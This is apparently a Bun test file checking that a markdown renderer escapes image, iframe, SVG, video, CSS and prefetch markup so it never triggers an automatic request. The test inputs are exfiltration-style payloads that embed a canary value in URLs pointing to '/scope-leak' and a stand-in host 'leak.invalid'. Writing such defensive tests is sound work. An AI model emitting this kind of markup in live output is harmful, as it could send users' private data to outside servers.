import { expect, test } from 'bun:test'
import { perspectiveMarkdown } from './perspective-markdown.ts'

test('private canaries cannot become automatic relative/external media, HTML, SVG or CSS requests', () => {
  const canary = 'BLUE_RUNTIME_CANARY'
  const markup = perspectiveMarkdown([
    `![relative](/scope-leak?value=${canary})`,
    `![external](https://leak.invalid/${canary})`,
    `<iframe src="/scope-leak?value=${canary}"></iframe>`,
    `<img src="https://leak.invalid/${canary}" srcset="/scope-leak?value=${canary} 2x">`,
    `<svg><image href="/scope-leak?value=${canary}"></image></svg>`,
    `<video poster="/scope-leak?value=${canary}"><source src="/scope-leak?value=${canary}"></video>`,
    `<div style="background-image:url('/scope-leak?value=${canary}')">HTML remains text</div>`,
    `<link rel="prefetch" href="/scope-leak?value=${canary}">`,
  ].join('\n\n'))
  expect(markup).not.toMatch(/<(?:img|iframe|svg|video|source|link|style|div)\b/i)
  expect(markup).toContain('&lt;iframe')
  expect(markup).toContain('Image unavailable')
  expect(markup).toContain(canary) // Readable code/text is retained, never emitted as an auto-loading element.
})

test('private code and prose remain readable while rich fences are inert source', () => {
  const markup = perspectiveMarkdown('**Permitted observation**\n\n```html\n<iframe src="/scope-leak"></iframe>\n```\n\n```mermaid\ngraph TD; A-->B\n```\n\n[Explicit link](https://example.invalid/read)')
  expect(markup).toContain('<strong>Permitted observation</strong>')
  expect(markup).toContain('<pre><code')
  expect(markup).toContain('&lt;iframe')
  expect(markup).not.toContain('<iframe')
  expect(markup).toContain('graph TD; A--&gt;B')
  expect(markup).toContain('<a href="https://example.invalid/read">Explicit link</a>')
})
